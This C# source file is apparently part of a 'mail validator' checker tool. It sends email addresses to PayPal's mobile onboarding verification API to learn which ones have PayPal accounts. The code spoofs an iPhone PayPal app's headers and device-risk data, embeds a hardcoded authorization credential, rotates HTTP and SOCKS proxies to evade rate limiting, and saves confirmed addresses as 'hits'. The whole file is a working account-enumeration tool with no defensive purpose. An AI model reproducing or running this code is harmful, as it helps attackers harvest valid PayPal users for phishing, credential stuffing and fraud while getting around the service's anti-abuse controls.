using System;
using Leaf.xNet;
using CheckerSimplefied;

namespace SC___Mail_Validator
{
    class PaypalVM
    {
        public static void postRequests(string username)
        {
            Utilities.name = "PayPal";
            for (; ; )
            {
                try
                {
                    if (Program.proxyType > 0)
                    {
                        Program.proxies = Program.PROXIES[new Random().Next(Program.PROXIES.Count)];
                    }
                    using (HttpRequest request = new HttpRequest())
                    {
                        switch ((int)((uint)Program.proxyType + ~(uint)1 + (uint)1))
                        {
                            case 0:
                                request.Proxy = HttpProxyClient.Parse(Program.proxies);
                                break;
                            case 1:
                                request.Proxy = Socks4ProxyClient.Parse(Program.proxies);
                                break;
                            case 2:
                                request.Proxy = Socks5ProxyClient.Parse(Program.proxies);
                                break;
                        }
                        request.UserAgent = "PayPal/77 (iPhone; iOS 14.0.1; Scale/2.00)";
                        AmelioratedWrapper.AddHeaderWithStyle(request, "paypal-client-metadata-id: b27792a1676f4355b929503a6e5dabf2");
                        AmelioratedWrapper.AddHeaderWithStyle(request, "Authorization: Basic QVY4aGRCQk04MHhsZ0tzRC1PYU9ReGVlSFhKbFpsYUN2WFdnVnB2VXFaTVRkVFh5OXBtZkVYdEUxbENxOg==");
                        AmelioratedWrapper.AddHeaderWithStyle(request, "Content-Type: application/json");
                        AmelioratedWrapper.AddHeaderWithStyle(request, "paypal-request-id: 644a3d46b10f4fb9b83e87969b8f3b7b");
                        AmelioratedWrapper.AddHeaderWithStyle(request, "x-paypal-mobileapp: dmz-access-header");
                        AmelioratedWrapper.AddHeaderWithStyle(request, "X-PayPal-ConsumerApp-Context: %7B%22deviceLocationCountry%22%3A%22DZ%22%2C%22deviceLocale%22%3A%22en_DZ%22%2C%22deviceOSVersion%22%3A%2214.0.1%22%2C%22deviceLanguage%22%3A%22en-DZ%22%2C%22appGuid%22%3A%22085E29B9-325D-430B-9004-3BE6E4D3B833%22%2C%22deviceId%22%3A%220629A0AB-9072-4D4D-A66F-49E49BCC187C%22%2C%22deviceType%22%3A%22iOS%22%2C%22deviceNetworkCarrier%22%3A%22Unknown%22%2C%22deviceModel%22%3A%22iPhone%22%2C%22appName%22%3A%22com.yourcompany.PPClient%22%2C%22deviceOS%22%3A%22iOS%22%2C%22visitorId%22%3A%22085E29B9-325D-430B-9004-3BE6E4D3B833%22%2C%22deviceNetworkType%22%3A%22Unknown%22%2C%22usageTrackerSessionId%22%3A%22FA56BAC6-2157-47BF-817C-87D2880DDEF8%22%2C%22appVersion%22%3A%228.4.3%22%2C%22sdkVersion%22%3A%221.0.0%22%2C%22deviceMake%22%3A%22Apple%22%2C%22riskVisitorId%22%3A%22oZN2bYdCd8cKU_1hHi0in7L5gf_txMCZaHuuydJyVbCrTHZKbIZqjldBY9RRBLZxWbL_spHqm8_c9-Oy%22%7D");
                        AmelioratedWrapper.AddHeaderWithStyle(request, "X-PAYPAL-FPTI: {\"user_guid\":\"085E29B9 - 325D - 430B - 9004 - 3BE6E4D3B833\",\"user_session_guid\":\"FA56BAC6 - 2157 - 47BF - 817C - 87D2880DDEF8\"}");
                        string url = "https://api-m.paypal.com/v1/mfsonboardingserv/user/verification/email";
                        var response = request.Raw(HttpMethod.POST, url, (HttpContent)new StringContent("{\"flowId\":\"Onboarding\",\"riskData\":\"{\\\"is_emulator\\\":false,\\\"device_uptime\\\":,\\\"ip_addrs\\\":\\\"\\\",\\\"risk_comp_session_id\\\":\\\"\\\",\\\"device_model\\\":\\\"iPhone\\\",\\\"linker_id\\\":\\\"\\\",\\\"app_version\\\":\\\"7.42.3\\\",\\\"os_type\\\":\\\"iOS\\\",\\\"location_auth_status\\\":\\\"unknown\\\",\\\"is_rooted\\\":false,\\\"ds\\\":true,\\\"TouchIDEnrolled\\\":\\\"false\\\",\\\"app_id\\\":\\\"com.yourcompany.PPClient\\\",\\\"proxy_setting\\\":\\\"host=,port=,type=\\\",\\\"conf_url\\\":\\\"https:\\\\/\\\\/www.paypalobjects.com\\\\/rdaAssets\\\\/magnes\\\\/magnes_ios_rec.json\\\",\\\"payload_type\\\":\\\"full\\\",\\\"rf\\\":\\\"0000\\\",\\\"app_guid\\\":\\\"\\\",\\\"email_configured\\\":true,\\\"tz_name\\\":\\\"Europe\\\\/\\\",\\\"locale_lang\\\":\\\"en\\\",\\\"bindSchemeAvailable\\\":\\\"crypto:kmli,biometric:faceid\\\",\\\"cloud_identifier\\\":\\\"\\\",\\\"total_storage_space\\\":127933894656,\\\"tz\\\":7200000,\\\"locale_country\\\":\\\"\\\",\\\"pairing_id\\\":\\\"\\\",\\\"dbg\\\":false,\\\"c\\\":95,\\\"sr\\\":{\\\"gy\\\":true,\\\"mg\\\":true,\\\"ac\\\":true},\\\"vendor_identifier\\\":\\\"\\\",\\\"t\\\":false,\\\"TouchIDAvailable\\\":\\\"true\\\",\\\"dc_id\\\":\\\"\\\",\\\"device_name\\\":\\\"\\\",\\\"magnes_source\\\":10,\\\"pin_lock_last_timestamp\\\":,\\\"local_identifier\\\":\\\"\\\",\\\"os_version\\\":\\\"14.6\\\",\\\"timestamp\\\":1626436936905,\\\"source_app_version\\\":\\\"7.42.3\\\",\\\"conn_type\\\":\\\"wifi\\\",\\\"PasscodeSet\\\":\\\"true\\\",\\\"magnes_guid\\\":{\\\"created_at\\\":1594847338188,\\\"id\\\":\\\"\\\"},\\\"conf_version\\\":\\\"1.0\\\",\\\"ip_addresses\\\":[\\\"\\\"],\\\"bindSchemeEnrolled\\\":\\\"none\\\",\\\"mg_id\\\":\\\"\\\",\\\"comp_version\\\":\\\"5.2.0\\\",\\\"sms_enabled\\\":true}\",\"appInfo\":\"{\\\"device_app_id\\\":\\\"com.yourcompany.PPClient\\\",\\\"client_platform\\\":\\\"Apple\\\",\\\"app_version\\\":\\\"7.42.3\\\",\\\"app_category\\\":3,\\\"app_guid\\\":\\\"\\\",\\\"push_notification_id\\\":\\\"disabled\\\"}\",\"emailId\":\"" + username + "\",\"firstPartyClientId\":\"\",\"deviceInfo\":\"{\\\"device_identifier\\\":\\\"\\\",\\\"device_name\\\":\\\"\\\",\\\"device_type\\\":\\\"iOS\\\",\\\"device_key_type\\\":\\\"APPLE_PHONE\\\",\\\"device_model\\\":\\\"iPhone\\\",\\\"device_os\\\":\\\"iOS\\\",\\\"device_os_version\\\":\\\"14.6\\\",\\\"is_device_simulator\\\":false,\\\"pp_app_id\\\":\\\"\\\"}\",\"redirectUri\":\"urn:ietf:wg:oauth:2.0:oob\"}")).ToString();

                        if (response.Contains("This email already exists with PayPal"))
                        {
                            Utilities.saveHits(username);
                            break;
                        }
                        if (response.Contains("\"status\":\"Failure\",\""))
                        {
                            Utilities.saveFail(username);
                            break;
                        }
                        if (response.Contains("RATE_LIMIT_REACHED"))
                        {
                            Utilities.catchRetry();
                            continue;
                        }
                    }
                }
                catch (Exception)
                {
                    Utilities.catchRetry();
                }
            }
        }
    }
}
